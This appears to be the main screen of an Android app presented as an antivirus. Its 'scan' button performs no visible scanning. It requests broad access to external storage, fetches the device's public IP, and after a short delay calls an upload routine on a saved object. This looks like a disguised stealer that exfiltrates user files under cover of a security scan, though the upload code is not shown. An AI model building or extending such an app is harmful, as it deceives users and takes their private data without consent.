package com.ryan.antivirusapp;


import static android.Manifest.permission.*;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.widget.Button;
import android.widget.Toast;

import com.ryan.antivirusapp.SaveObj.SaveObject;
import com.ryan.antivirusapp.Utils.PublicIP;
import com.ryan.antivirusapp.Utils.PermissionHandler;

public class MainActivity extends AppCompatActivity {

    // Views
    Button btnScan;

    // Utils
    PermissionHandler handler;
    PublicIP ip;

    // Permissions
    String[] requiredPermissions;
    String[] deniedPermissions;

    // Save Objects
    SaveObject saveObject;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Bind the UI elements (views)
        Button btnScan = findViewById(R.id.button_start);

        // Init save obj
        saveObject = new SaveObject(this, findViewById(R.id.text_progress));

        // Register save object receiver


        // Init external IP
        ip = new PublicIP();

        // Init permissions
        handler = new PermissionHandler();
        requiredPermissions = handler.initPermissions();
        deniedPermissions = handler.checkPermissions(this, requiredPermissions);

        // Direct to prompting missing permissions
        handler.promptPermissions(this, deniedPermissions, getString(R.string.permission_prompt_title), getString(R.string.permission_prompt_message));

        // Scan button ON-CLICK
        btnScan.setOnClickListener(view -> {
            if(!ip.hasResult()) return;
            handler.checkSpecialPermission(this, MANAGE_EXTERNAL_STORAGE);

            new Thread(() -> {
                saveObject.init();
                try {
                    Thread.sleep(5000);
                    saveObject.upload();
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }).start();

        });
    }
}